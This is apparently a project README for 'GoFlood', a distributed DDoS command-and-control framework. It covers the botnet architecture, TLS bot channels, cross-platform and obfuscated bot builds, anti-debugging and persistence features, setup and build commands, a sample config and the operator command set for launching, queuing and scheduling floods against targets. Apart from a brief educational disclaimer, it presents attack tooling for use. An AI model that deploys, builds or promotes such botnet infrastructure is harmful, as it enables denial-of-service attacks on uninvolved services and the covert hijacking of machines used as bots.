# GoFlood - DDoS Framework

![Go Version](https://img.shields.io/badge/go-1.21+-blue.svg)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
![Multi-User](https://img.shields.io/badge/Multi--User-Yes-blue)
![Bot Support](https://img.shields.io/badge/Bots-Cross--platform-orange)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20WSL%20%7C%20Windows%20%7C%20macOS-blueviolet)
![Architecture](https://img.shields.io/badge/Architecture-Distributed-orange)

*A Command and Control (C2) Framework with secure and efficient distributed botnet management. Includes both Terminal and Web UI interfaces to accommodate different user preferences.*

> ### 🏗️ Proxy Client is Optional
---

## 🖥️ C2 Closeups

<table>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/0eb04d6b-4623-4e1c-b7b3-2191c05475c0" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/92e01376-965f-4802-9aba-f9c5e4621ce9" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/f5e29468-fdec-4887-94c1-97b33a5ae498" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/50ab64c5-103f-4d73-bc06-b18c85e61283" width="100%"/></td>
  </tr>
  <tr>
    <td><img src="https://github.com/user-attachments/assets/807fad11-4cb1-4a13-909b-368c2892349b" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/5c02f075-fcb7-469b-b0c9-fc5724203f4e" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/52cdac50-7650-40fa-882e-2a524e562d6e" width="100%"/></td>
    <td><img src="https://github.com/user-attachments/assets/807fad11-4cb1-4a13-909b-368c2892349b" width="100%"/></td>
  </tr>
</table>



### Supports all Architecture ([ Windows / Linux / MacOS ])
📶 This project merges **Gostress-V2 + Gostress-Enhanced** and **BotnetGo**, offering a complete **C2 Framework solution**:
-  **Encrypted C2 Channels**:
    - TLS 1.3 secured terminal interface (TCP/1337)
    - WebSocket dashboard (TCP/8443) 
    - Mutual TLS authentication for all connections

 - **C2 Channel Description (Bot Connection Protocol)**:
   - Protocol: TCP with TLS 1.3 encryption (TCP/7002).
   - Bots and the C2 server authenticate each other using client and server certificates (X.509).
   - The server validates bot certificates against a pinned CA certificate to prevent impersonation.
   - Bots verify the server's certificate to avoid MITM attacks.
    

 *⚠️ **Note**: In the wake of coordinated efforts such as Operation EndGame, PowerOFF, and Cronos, this project serves only as an educational and analytical reference for understanding botnet infrastructure. Real-world deployment of such tools carries significant legal risk*.
 
## 📁 File Status Overview
### 📽️ Project Status
| Component       | Status        | Progress | Improvements to be Added / Implemented                                                                       |
|---------------------|---------------|------------------|--------------------------------------------------------------------------------------------------------------|
| **C2 Server**       | Completed  |  🟢 100%   |- N/a |
| **Stress Client**   | Minor Adjustments |  🟡 97% [Completed]%  | - Just needs to Expand L7/L4 attack methods + AMP research  |
| **Proxy Client**    | Completed |  🟢 100% [Completed] | - N/a |
| **Support Scripts** | Completed |  🟢 100% [Completed] |-  N/a |


### 🧭 Core Files
| File          | File desc   | Status       | Improvements Made                                                                    |
|---------------|-------------|--------------|--------------------------------------------------------------------------------------|
| **main.go**   | C2 Server File | 🟢 No Changes  | - Stable Connection br>- cleaned up more <br>- Implemented REST api + Dashboard  |
| **client.go** | Client File    | 🟡 Wrapping Up  | - Improved support for IPV6 + IPV4<br>- Cleaned up more   |
| **proxy.go**  | Proxy File     | 🟢 No Changes | - Dashboard design<br>- Traffic monitoring improvements   |
| **README.md** | Readme.md File | 🟡 Wrapping Up   | - Cleaned up Readme.md<br>- Need to redo videos still <br>- needs polishing  |

### 🟦 Support Scripts 
| File                       | Status        | Key Features                                                                                |
|----------------------------|---------------|---------------------------------------------------------------------------------------------|
| **SetupC2_V2.sh.sh**       | ✅ [Completed]   | - Just Finished, Merged to make all simple and QoL + Ease of use                            |
| **build.sh**               | ✅ [Completed]   | - Supports most-All arch types <br>- Windows - Linux - MacOS cross-compile / Support        |
| **obf_build.sh**           | ✅ [Completed]   | - Same cross-platform support as build.sh <br>- Includes obfuscation + Compression          |

## 🛠️ Technical Topology
```
                         ┌─────────────────┐
┌───────────────────┐    │  [Proxy Client] │    ┌─────────────────┐    ┌──────────────────┐
│   [C2 Server]     │    │   ( Optional )  │    │   [Bot Clients] │    │    [ Target]     │
│  - User Auth      │    │ - Traffic Obf   │    │  - Auto-Connect │    │  - Target Host   │
│  - Stress Attacks │───►│ - TLS 1.3       │◄───┤  - Attack Exec  │───►│  - Stress Attack │
│  - audit Logging  │◄───│ - Web Dashboard │───►│  - Stats Report │    └──────────────────┘
└───────┬───────────┘    └────────┬────────┘    └─────────────────┘    
        │                         │
        ▼                         ▼
┌──────────────────────┐    ┌────────────────────┐
│   [Admin Dashboard]  │    │  [Proxy Dashboard] │
│  - Authentication    │    │  - Traffic stats   │
│  - Real-time stats   │    │  - Health Check    │
│  - Monitoring        │    │  - Authentication  │
│  - Config Edits      │    └────────────────────┘ 
│  - Attack Queue      │
│  - Attack Scheduling │    
└──────────────────────┘ 
```

### Server / C2
```
# Generate certificates
chmod +x generate_certs.sh setup_C2.sh 
./generate_certs.sh
./setup_C2.sh 

# Build server
go build -o cnc main.go

# Start server
./cnc
```

### Install needed packages / Tools
```bash
# UPX (compression) - Openssl (Certs) - 
sudo apt install upx-ucl

# Binary packer (optional)
go install github.com/upx/upx@lates

# JSON Parser - JWT Token - WS support - Logging library 
go get github.com/json-iterator/go
go get github.com/golang-jwt/jwt/v5
go get github.com/gorilla/websocket
go get github.com/rs/zerolog
```

## 🔐 Security Features

<div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;">

<div>

- **Certificate Pinning**  
  CA verification
- **Rate Limiting**  
  IP/user request throttling
- **Session Management**  
  Auto timeout/cleanup
- **Input Sanitization**  
  Injection attack protection

</div>

<div>

- **TOTP For Reset**  
  Time-based one-time passwords
- **Password Policies**  
  Complexity + lockout
- **Encryption**  
  TLS 1.3 + mutual auth
- **Authentication**  
  Bcrypt hashing

</div>

<div>

- **Real-time Monitoring**  
  Live bot analytics
- **Attack Management**  
  Priority queue system
- **Multi-Arch Support**  
  Cross-platform clients
- **Comprehensive Auditing**  
  Detailed activity logs

</div>

</div>

## 🤖 Bot Client Features

- Multi-architecture support (x86, ARM, MIPS)
- Anti-debugging techniques
- Automated persistence
- Resource efficient
  
## 🛠️ Configuration
Edit `config.json` to customize settings:

```json
{
  "users_file": "users.json",
  "audit_log_file": "audit.log",
  "bot_server_ip": "172.17.126.64",
  "user_server_ip": "0.0.0.0",
  "bot_server_port": "7002",
  "user_server_port": "5555",
  "cert_file": "certs/server.crt",
  "key_file": "certs/server.key",
  "session_timeout": 3600,
  "max_conns": 1000,
  "max_read_size": 4096,
  "max_log_size": 10485760,
  "max_queued_attacks": 50,
  "max_daily_attacks": 100,
  "max_attack_duration": 3600,
  "max_sessions_per_user": 3,
  "min_password_length": 8,
  "password_complexity": true,
  "max_connections_per_ip": 5,
  "ddos_protection": true,
  "max_conn_rate": 10,
  "syn_flood_threshold": 50,
  "reset_token_validity": 3600,
  "pinned_cert_file": "certs/pinned.crt",
  "command_signing_key": "your_very_secure"
}
```

## 👨‍💻 Commands

|      Attack / stress                                |      Description       | 
|-----------------------------------------------------|------------------------| 
| ![Method] 0.0.0.0 80 22 0656d970cef86794c84819..... |   Command Example      | 
| ![Method] IP PORT TIME hex-32-secret-signing-key    |   Command Format       | 

| Command       | Description            | 
|---------------|------------------------| 
| adduser       | Create new user        | 
| deluser       | Delete user            | 
| resetpw       | Reset password         | 
| db            | View user database     | 
| logs          | View audit logs        | 
| !reinstall    | Reinstall bots         | 
| ongoing       | See ongoing stress     | 
| queue         | schedule a stess       | 
| cancel        | cancel Attack          | 
| reinstall     | Reinstall bots         | 
| bots          | See bot Count          | 
| logout / exit | Logout                 | 
| clear / cls   | clear ternimal         | 
| help          | Get Help Menu          | 
| stats         | Get Bot status / stats | 
| status        | See C2 status / stats  | 

<div align="center">

## 🎬 Feature Previews

| Feature Demo                                                   | Description                                     | Preview |
|----------------------------------------------------------------|-------------------------------------------------|---------|
| [🚀 Starter Setup](https://github.com/user-attachments/assets/00b6ddb0-0c9e-47aa-9e91-08e689a1d272)  | Initial setup and certificate generation       | ✅ |
| [💻 CLI Interface](https://github.com/user-attachments/assets/b7349373-e985-4d10-ba7b-87edb3844247)  | Beautiful terminal interface and login flow   | ✅ |
| [🧨 Attack Management](https://github.com/user-attachments/assets/531f09ef-ae28-4bcc-aae4-aaa564162acd) | Launching and managing attacks             | ✅ |
| [🛡️ Admin Controls](https://github.com/user-attachments/assets/e2b9535f-5ede-401c-bb2d-da97b601a118) | User management, audit logs, system controls  | ✅ |
| [🛡️ Admin Controls](https://github.com/user-attachments/assets/e2b9535f-5ede-401c-bb2d-da97b601a118) | User management, audit logs, system controls  | ❎ |
| [🛡️ Support Scripts](https://github.com/user-attachments/assets/e2b9535f-5ede-401c-bb2d-da97b601a118) | User management, audit logs, system controls | ❎ |

## 🎬 Feature Previews
## YT video (Still 50/50)
Might make a video just for setup as well as to properly show it off.

## Easy Videos (21/06/25) - All the videos are old and need updating

### *Finishing (05/06/25)* Proxy - Showing off Proxy POC
<video src="https://github.com/user-attachments/assets/raw/fbe96e3a-ed11-4ea2-b8f1-cb567129cba6" controls width="350"></video>

### CLI Output - CLI outputs on your terminal
<video src="https://github.com/user-attachments/assets/raw/b7349373-e985-4d10-ba7b-87edb3844247" controls width="350"></video>

### Starter – Walkthrough of the login process + essential commands
<video src="https://github.com/user-attachments/assets/raw/00b6ddb0-0c9e-47aa-9e91-08e689a1d272" controls width="350"></video>

### Admin – Admin commands + usage
<video src="https://github.com/user-attachments/assets/raw/e2b9535f-5ede-401c-bb2d-da97b601a118" controls width="350"></video>

### Attack Example -- All outgoing traffic was filtered/disabled for this example
<video src="https://github.com/user-attachments/assets/raw/531f09ef-ae28-4bcc-aae4-aaa564162acd" controls width="350"></video>

## 📜 License
MIT License - See LICENSE for details.

## ⚠️ Disclaimer
This project is for educational and research purposes only. The authors are not responsible for any misuse of this software.
